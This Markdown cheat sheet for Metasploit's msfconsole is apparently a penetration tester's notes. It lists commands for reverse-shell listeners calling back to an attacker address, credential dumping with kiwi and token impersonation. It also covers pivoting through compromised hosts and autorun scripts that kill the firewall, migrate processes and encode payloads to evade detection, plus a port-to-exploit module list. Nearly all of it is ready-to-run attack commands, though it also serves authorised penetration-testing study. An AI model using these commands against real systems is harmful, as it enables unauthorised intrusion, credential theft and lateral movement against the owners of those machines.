# MSFConsole
#### Start metasploit
- The correct way

```
systemctl start postgresql
sudo msfdb init #only the first time!
sudo msfdb start
sudo msfdb run #start both db and msfconsole
sudo msfconsole
```

#### Start listener
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

#### Background the sessions
```
Background
```

#### List sessions
```
sessions
```

#### Kill session
```
sessions -k <id>
```

#### Enter sessions
```
sessions -i <id>
```

#### Load kiwi module to dump creds and print help for kiwi
```
load kiwi
help kiwi
```

#### Load PowerShell and drop into shell
```
load powershell
powershell_shell
```

#### Metasploit imperssonate
```
Load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

#### Upgrade shell to meterpreter
```
use multi/manage/shell_to_meterpreter
set SESSION
set LHOST
set LPORT
run
```

## Routing
#### Set route
```
route add <subnet / host ip> <subnetmask> <session id>
```

#### Autoroute modulle
```
use multi/manage/autoroute
```

#### Run autoroute
```
run autoroute -s 10.100.11.0/24
```

#### Create port forward
```
Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
```

#### After setting routes use bind shells

#### Proxychains
```
use server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 9000
set VERSION 4a
```

## Autorun script
### Set solo module as autorunscript
```
set AutoRunScript windows/gather/enum_logged_on_users
set AutoRunScript post/windows/manage/migrate
```

#### Create a .rc file and use it like:
```
run post/windows/manage/migrate
run post/windows/manage/killfw
run post/windows/gather/checkvm
```

```
set AutoRunScript multi_console_command -rc /root/autoruncommands.rc
```

## Metasploit automation run automatic script
#### Create a .rc file
```
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```

#### Start metasploit with .rc file
```
sudo msfconsole -r setup.rc
```

## Sessions

- Interact with sessions
`sessions -i <id>`

- Save sessionn
`sessions -u <filename>`

- Restore session
`sessions -r <filename>`

- Set module's RHOST with databse values
`hosts -R or services -R`

- Set global variable
`setg RHOSTS x.x.x.x`

- Upgrade shell to meterpreter
`sessions -u <session_id>`

- Run and background
`exploit -z`


## PORTS

- 21 FTP
`exploit/unix/ftp/vsftpd_234_backdoor`
`auxiliary/scanner/ftp/ftp_login`

- 22 SSH
`auxiliary/scanner/ssh/ssh_login`

- 23 TELNET
`auxiliary/scanner/telnet/telnet_login`

- 25 SMTP
`auxiliary/scanner/smtp/smtp_enum`

- 80 HTTP
`auxiliary/scanner/http/http_version`
`exploit/multi/http/php_cgi_arg_injection`

- 139,445 SMB
`auxiliary/scanner/smb/smb_version`
`exploit/multi/samba/usermap_script`

- 512,513,514 exec,login,tcpwrapped
`rsh-client (rlogin -l root <ip>)`
`rsh -l <ip> ifconfig`
